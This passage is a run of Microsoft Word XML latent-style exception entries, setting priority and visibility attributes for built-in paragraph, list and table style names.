  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="annotation text"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="header"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="footer"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="index heading"/>
  <w:LsdException Locked="false" Priority="35" SemiHidden="true"
   UnhideWhenUsed="true" QFormat="true" Name="caption"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="table of figures"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="envelope address"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="envelope return"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="footnote reference"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="annotation reference"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="line number"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="page number"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="endnote reference"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="endnote text"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="table of authorities"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="macro"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="toa heading"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Bullet"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Number"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List 4"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List 5"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Bullet 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Bullet 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Bullet 4"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Bullet 5"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Number 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Number 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Number 4"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Number 5"/>
  <w:LsdException Locked="false" Priority="10" QFormat="true" Name="Title"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Closing"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Signature"/>
  <w:LsdException Locked="false" Priority="1" SemiHidden="true"
   UnhideWhenUsed="true" Name="Default Paragraph Font"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Body Text"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Body Text Indent"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Continue"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Continue 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Continue 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Continue 4"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="List Continue 5"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Message Header"/>
  <w:LsdException Locked="false" Priority="11" QFormat="true" Name="Subtitle"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Salutation"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Date"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Body Text First Indent"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Body Text First Indent 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Note Heading"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Body Text 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Body Text 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Body Text Indent 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Body Text Indent 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Block Text"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Hyperlink"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="FollowedHyperlink"/>
  <w:LsdException Locked="false" Priority="22" QFormat="true" Name="Strong"/>
  <w:LsdException Locked="false" Priority="20" QFormat="true" Name="Emphasis"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Document Map"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Plain Text"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="E-mail Signature"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="HTML Top of Form"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="HTML Bottom of Form"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Normal (Web)"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="HTML Acronym"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="HTML Address"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="HTML Cite"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="HTML Code"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="HTML Definition"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="HTML Keyboard"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="HTML Preformatted"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="HTML Sample"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="HTML Typewriter"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="HTML Variable"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Normal Table"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="annotation subject"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="No List"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Outline List 1"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Outline List 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Outline List 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Simple 1"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Simple 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Simple 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Classic 1"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Classic 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Classic 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Classic 4"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Colorful 1"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Colorful 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Colorful 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Columns 1"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Columns 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Columns 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Columns 4"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Columns 5"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Grid 1"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Grid 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Grid 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Grid 4"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Grid 5"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Grid 6"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Grid 7"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Grid 8"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table List 1"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table List 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table List 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table List 4"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table List 5"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table List 6"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table List 7"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table List 8"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table 3D effects 1"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table 3D effects 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table 3D effects 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Contemporary"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Elegant"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Professional"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Subtle 1"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Subtle 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Web 1"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Web 2"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Web 3"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Balloon Text"/>
  <w:LsdException Locked="false" Priority="39" Name="Table Grid"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Table Theme"/>
  <w:LsdException Locked="false" SemiHidden="true" Name="Placeholder Text"/>
  <w:LsdException Locked="false" Priority="1" QFormat="true" Name="No Spacing"/>
  <w:LsdException Locked="false" Priority="60" Name="Light Shading"/>
  <w:LsdException Locked="false" Priority="61" Name="Light List"/>
  <w:LsdException Locked="false" Priority="62" Name="Light Grid"/>
  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1"/>
  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2"/>
  <w:LsdException Locked="false" Priority="65" Name="Medium List 1"/>
  <w:LsdException Locked="false" Priority="66" Name="Medium List 2"/>
  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1"/>
  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2"/>
  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3"/>
  <w:LsdException Locked="false" Priority="70" Name="Dark List"/>
  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading"/>
  <w:LsdException Locked="false" Priority="72" Name="Colorful List"/>
  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid"/>
  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 1"/>
  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 1"/>
  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 1"/>
  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 1"/>
  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 1"/>
  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 1"/>
  <w:LsdException Locked="false" SemiHidden="true" Name="Revision"/>
  <w:LsdException Locked="false" Priority="34" QFormat="true"
   Name="List Paragraph"/>
  <w:LsdException Locked="false" Priority="29" QFormat="true" Name="Quote"/>
  <w:LsdException Locked="false" Priority="30" QFormat="true"
   Name="Intense Quote"/>
  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 1"/>
  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 1"/>
  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 1"/>
  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 1"/>
  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 1"/>
  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 1"/>
  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 1"/>
  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 1"/>
  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 2"/>
  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 2"/>
  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 2"/>
  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 2"/>
  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 2"/>
  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 2"/>
  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 2"/>
  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 2"/>
  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 2"/>
  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 2"/>
  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 2"/>
  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 2"/>
  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 2"/>
  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 2"/>
  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 3"/>
  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 3"/>
  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 3"/>
  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 3"/>
  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 3"/>
  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 3"/>
  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 3"/>
  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 3"/>
  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 3"/>
  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 3"/>
  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 3"/>
  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 3"/>
  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 3"/>
  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 3"/>
  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 4"/>
  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 4"/>
  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 4"/>
  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 4"/>
  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 4"/>
  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 4"/>
  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 4"/>
  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 4"/>
  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 4"/>
  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 4"/>
  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 4"/>
  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 4"/>
  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 4"/>
  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 4"/>
  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 5"/>
  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 5"/>
  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 5"/>
  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 5"/>
  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 5"/>
  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 5"/>
  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 5"/>
  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 5"/>
  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 5"/>
  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 5"/>
  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 5"/>
  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 5"/>
  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 5"/>
  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 5"/>
  <w:LsdException Locked="false" Priority="60" Name="Light Shading Accent 6"/>
  <w:LsdException Locked="false" Priority="61" Name="Light List Accent 6"/>
  <w:LsdException Locked="false" Priority="62" Name="Light Grid Accent 6"/>
  <w:LsdException Locked="false" Priority="63" Name="Medium Shading 1 Accent 6"/>
  <w:LsdException Locked="false" Priority="64" Name="Medium Shading 2 Accent 6"/>
  <w:LsdException Locked="false" Priority="65" Name="Medium List 1 Accent 6"/>
  <w:LsdException Locked="false" Priority="66" Name="Medium List 2 Accent 6"/>
  <w:LsdException Locked="false" Priority="67" Name="Medium Grid 1 Accent 6"/>
  <w:LsdException Locked="false" Priority="68" Name="Medium Grid 2 Accent 6"/>
  <w:LsdException Locked="false" Priority="69" Name="Medium Grid 3 Accent 6"/>
  <w:LsdException Locked="false" Priority="70" Name="Dark List Accent 6"/>
  <w:LsdException Locked="false" Priority="71" Name="Colorful Shading Accent 6"/>
  <w:LsdException Locked="false" Priority="72" Name="Colorful List Accent 6"/>
  <w:LsdException Locked="false" Priority="73" Name="Colorful Grid Accent 6"/>
  <w:LsdException Locked="false" Priority="19" QFormat="true"
   Name="Subtle Emphasis"/>
  <w:LsdException Locked="false" Priority="21" QFormat="true"
   Name="Intense Emphasis"/>
  <w:LsdException Locked="false" Priority="31" QFormat="true"
   Name="Subtle Reference"/>
  <w:LsdException Locked="false" Priority="32" QFormat="true"
   Name="Intense Reference"/>
  <w:LsdException Locked="false" Priority="33" QFormat="true" Name="Book Title"/>
  <w:LsdException Locked="false" Priority="37" SemiHidden="true"
   UnhideWhenUsed="true" Name="Bibliography"/>
  <w:LsdException Locked="false" Priority="39" SemiHidden="true"
   UnhideWhenUsed="true" QFormat="true" Name="TOC Heading"/>
  <w:LsdException Locked="false" Priority="41" Name="Plain Table 1"/>
  <w:LsdException Locked="false" Priority="42" Name="Plain Table 2"/>
  <w:LsdException Locked="false" Priority="43" Name="Plain Table 3"/>
  <w:LsdException Locked="false" Priority="44" Name="Plain Table 4"/>
  <w:LsdException Locked="false" Priority="45" Name="Plain Table 5"/>
  <w:LsdException Locked="false" Priority="40" Name="Grid Table Light"/>
  <w:LsdException Locked="false" Priority="46" Name="Grid Table 1 Light"/>
  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2"/>
  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3"/>
  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4"/>
  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark"/>
  <w:LsdException Locked="false" Priority="51" Name="Grid Table 6 Colorful"/>
  <w:LsdException Locked="false" Priority="52" Name="Grid Table 7 Colorful"/>
  <w:LsdException Locked="false" Priority="46"
   Name="Grid Table 1 Light Accent 1"/>
  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 1"/>
  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 1"/>
  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 1"/>
  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 1"/>
  <w:LsdException Locked="false" Priority="51"
   Name="Grid Table 6 Colorful Accent 1"/>
  <w:LsdException Locked="false" Priority="52"
   Name="Grid Table 7 Colorful Accent 1"/>
  <w:LsdException Locked="false" Priority="46"
   Name="Grid Table 1 Light Accent 2"/>
  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 2"/>
  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 2"/>
  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 2"/>
  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 2"/>
  <w:LsdException Locked="false" Priority="51"
   Name="Grid Table 6 Colorful Accent 2"/>
  <w:LsdException Locked="false" Priority="52"
   Name="Grid Table 7 Colorful Accent 2"/>
  <w:LsdException Locked="false" Priority="46"
   Name="Grid Table 1 Light Accent 3"/>
  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 3"/>
  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 3"/>
  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 3"/>
  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 3"/>
  <w:LsdException Locked="false" Priority="51"
   Name="Grid Table 6 Colorful Accent 3"/>
  <w:LsdException Locked="false" Priority="52"
   Name="Grid Table 7 Colorful Accent 3"/>
  <w:LsdException Locked="false" Priority="46"
   Name="Grid Table 1 Light Accent 4"/>
  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 4"/>
  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 4"/>
  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 4"/>
  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 4"/>
  <w:LsdException Locked="false" Priority="51"
   Name="Grid Table 6 Colorful Accent 4"/>
  <w:LsdException Locked="false" Priority="52"
   Name="Grid Table 7 Colorful Accent 4"/>
  <w:LsdException Locked="false" Priority="46"
   Name="Grid Table 1 Light Accent 5"/>
  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 5"/>
  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 5"/>
  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 5"/>
  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 5"/>
  <w:LsdException Locked="false" Priority="51"
   Name="Grid Table 6 Colorful Accent 5"/>
  <w:LsdException Locked="false" Priority="52"
   Name="Grid Table 7 Colorful Accent 5"/>
  <w:LsdException Locked="false" Priority="46"
   Name="Grid Table 1 Light Accent 6"/>
  <w:LsdException Locked="false" Priority="47" Name="Grid Table 2 Accent 6"/>
  <w:LsdException Locked="false" Priority="48" Name="Grid Table 3 Accent 6"/>
  <w:LsdException Locked="false" Priority="49" Name="Grid Table 4 Accent 6"/>
  <w:LsdException Locked="false" Priority="50" Name="Grid Table 5 Dark Accent 6"/>
  <w:LsdException Locked="false" Priority="51"
   Name="Grid Table 6 Colorful Accent 6"/>
  <w:LsdException Locked="false" Priority="52"
   Name="Grid Table 7 Colorful Accent 6"/>
  <w:LsdException Locked="false" Priority="46" Name="List Table 1 Light"/>
  <w:LsdException Locked="false" Priority="47" Name="List Table 2"/>
  <w:LsdException Locked="false" Priority="48" Name="List Table 3"/>
  <w:LsdException Locked="false" Priority="49" Name="List Table 4"/>
  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark"/>
  <w:LsdException Locked="false" Priority="51" Name="List Table 6 Colorful"/>
  <w:LsdException Locked="false" Priority="52" Name="List Table 7 Colorful"/>
  <w:LsdException Locked="false" Priority="46"
   Name="List Table 1 Light Accent 1"/>
  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 1"/>
  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 1"/>
  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 1"/>
  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 1"/>
  <w:LsdException Locked="false" Priority="51"
   Name="List Table 6 Colorful Accent 1"/>
  <w:LsdException Locked="false" Priority="52"
   Name="List Table 7 Colorful Accent 1"/>
  <w:LsdException Locked="false" Priority="46"
   Name="List Table 1 Light Accent 2"/>
  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 2"/>
  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 2"/>
  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 2"/>
  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 2"/>
  <w:LsdException Locked="false" Priority="51"
   Name="List Table 6 Colorful Accent 2"/>
  <w:LsdException Locked="false" Priority="52"
   Name="List Table 7 Colorful Accent 2"/>
  <w:LsdException Locked="false" Priority="46"
   Name="List Table 1 Light Accent 3"/>
  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 3"/>
  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 3"/>
  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 3"/>
  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 3"/>
  <w:LsdException Locked="false" Priority="51"
   Name="List Table 6 Colorful Accent 3"/>
  <w:LsdException Locked="false" Priority="52"
   Name="List Table 7 Colorful Accent 3"/>
  <w:LsdException Locked="false" Priority="46"
   Name="List Table 1 Light Accent 4"/>
  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 4"/>
  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 4"/>
  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 4"/>
  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 4"/>
  <w:LsdException Locked="false" Priority="51"
   Name="List Table 6 Colorful Accent 4"/>
  <w:LsdException Locked="false" Priority="52"
   Name="List Table 7 Colorful Accent 4"/>
  <w:LsdException Locked="false" Priority="46"
   Name="List Table 1 Light Accent 5"/>
  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 5"/>
  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 5"/>
  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 5"/>
  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 5"/>
  <w:LsdException Locked="false" Priority="51"
   Name="List Table 6 Colorful Accent 5"/>
  <w:LsdException Locked="false" Priority="52"
   Name="List Table 7 Colorful Accent 5"/>
  <w:LsdException Locked="false" Priority="46"
   Name="List Table 1 Light Accent 6"/>
  <w:LsdException Locked="false" Priority="47" Name="List Table 2 Accent 6"/>
  <w:LsdException Locked="false" Priority="48" Name="List Table 3 Accent 6"/>
  <w:LsdException Locked="false" Priority="49" Name="List Table 4 Accent 6"/>
  <w:LsdException Locked="false" Priority="50" Name="List Table 5 Dark Accent 6"/>
  <w:LsdException Locked="false" Priority="51"
   Name="List Table 6 Colorful Accent 6"/>
  <w:LsdException Locked="false" Priority="52"
   Name="List Table 7 Colorful Accent 6"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Mention"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Smart Hyperlink"/>
  <w:LsdException Locked="false" SemiHidden="true" UnhideWhenUsed="true"
   Name="Hashtag"/>
